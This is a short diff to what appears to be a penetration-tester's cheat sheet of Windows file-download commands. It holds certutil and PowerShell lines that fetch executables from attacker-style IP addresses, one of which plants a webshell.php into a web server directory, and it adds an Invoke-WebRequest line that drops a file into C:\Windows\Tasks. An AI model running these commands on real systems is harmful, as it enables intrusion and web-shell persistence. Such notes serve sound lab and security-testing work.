@@ -5,6 +5,8 @@ wget for Windows:
 certutil.exe -urlcache -f http://172.16.1.100:8001/FILE.exe OUTFILE.exe
 or
 powershell "(New-Object System.Net.WebClient).DownloadFile('http://HOST:PORT/webshell.php', 'C:\Apache24\htdocs\SOME_DIR\BLEND_ING.php')"
+or
+powershell iwr -uri 'http://10.10.16.111/FILE.exe' -Outfile C:\\Windows\\Tasks\\FILE.exe
 ```
 
 check for impersonate privs and other privs:
